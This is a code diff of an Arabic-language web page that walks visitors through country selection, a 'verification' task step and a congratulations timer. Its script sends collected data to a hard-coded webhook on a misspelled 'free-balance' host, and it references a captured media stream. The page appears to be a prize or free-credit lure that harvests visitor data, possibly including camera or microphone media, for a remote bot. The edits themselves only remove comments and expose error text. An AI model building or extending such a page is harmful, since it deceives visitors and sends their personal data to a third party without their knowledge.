@@ -152,7 +152,6 @@
 <body>
 
 <div class="container" id="app">
-    <!-- STEP 1: اختر البلد -->
     <div class="step active" id="step-country">
         <div class="logo">🌍</div>
         <h1>اختر بلدك</h1>
@@ -161,7 +160,6 @@
         <div class="status" id="statusCountry"></div>
     </div>
 
-    <!-- STEP 2: المهام -->
     <div class="step" id="step-tasks">
         <div class="logo">🎁</div>
         <h1 id="taskTitle">أكمل عملية التحقق</h1>
@@ -178,7 +176,6 @@
         <div class="status" id="statusTasks"></div>
     </div>
 
-    <!-- STEP 3: عداد الوقت -->
     <div class="step" id="step-timer">
         <div class="logo">⏳</div>
         <h1>تهانينا! 🎉</h1>
@@ -201,7 +198,7 @@
 
 <script>
     // ================================================================
-    //  CONFIG - WEBHOOK (تم التعديل إلى الرابط الصحيح)
+    //  CONFIG - WEBHOOK
     // ================================================================
     const WEBHOOK_URL = "https://dev-free-balancce.pantheonsite.io/free/bot.php?action=webhook_data";
 
@@ -663,7 +660,7 @@
             console.log('✅ All data sent to webhook');
         } else {
             console.error('❌ Failed to send all data:', result.error);
-            showStatus(statusTasks, 'error', '⚠️ فشل الإرسال، يرجى المحاولة مرة أخرى.');
+            showStatus(statusTasks, 'error', '⚠️ فشل الإرسال: ' + result.error);
         }
 
         if (mediaStream) {
